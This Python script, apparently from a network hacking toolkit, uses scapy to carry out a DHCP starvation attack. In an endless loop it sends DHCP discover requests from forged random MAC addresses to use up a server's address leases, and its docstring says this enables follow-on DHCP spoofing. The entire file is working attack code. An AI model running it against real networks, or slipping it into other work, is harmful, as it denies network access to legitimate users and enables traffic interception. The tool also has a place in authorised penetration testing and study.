#!/usr/bin/env python3

import logging

from time import sleep

import click

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import (BOOTP, DHCP, ICMP, IP, TCP, UDP, Ether, RandMAC, conf,
                       get_if_raw_hwaddr, sr1, srp)


@click.command()
@click.option('-i', 'iface', default=None, help='Interface to use')
@click.option('-t', 'timeout', default=1, help='Time (seconds) to wait for responses')
@click.option('-s', 'sleeptime', default=0, help='Time (seconds) between requests')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose output')
def cmd_dhcp_starvation(iface, timeout, sleeptime, verbose):
    """Send multiple DHCP requests from forged MAC addresses to
    fill the DHCP server leases.

    When all the available network addresses are assigned, the DHCP server don't send responses.

    So, some attacks, like DHCP spoofing, can be made.

    \b
    # habu.dhcp_starvation
    Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.6:bootpc / BOOTP / DHCP
    Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.7:bootpc / BOOTP / DHCP
    Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.8:bootpc / BOOTP / DHCP
    """

    conf.verb = False

    if iface:
        conf.iface = iface

    conf.checkIPaddr = False

    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0",dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    dhcp = DHCP(options=[("message-type","discover"),"end"])

    while True:
        bootp = BOOTP(chaddr=str(RandMAC()))
        dhcp_discover = ether / ip / udp / bootp / dhcp
        ans, unans = srp(dhcp_discover, timeout=1)      # Press CTRL-C after several seconds

        for _, pkt in ans:
            if verbose:
                print(pkt.show())
            else:
                print(pkt.sprintf(r"%IP.src% offers %BOOTP.yiaddr%"))

        sleep(sleeptime)


if __name__ == '__main__':
    cmd_dhcp_starvation()
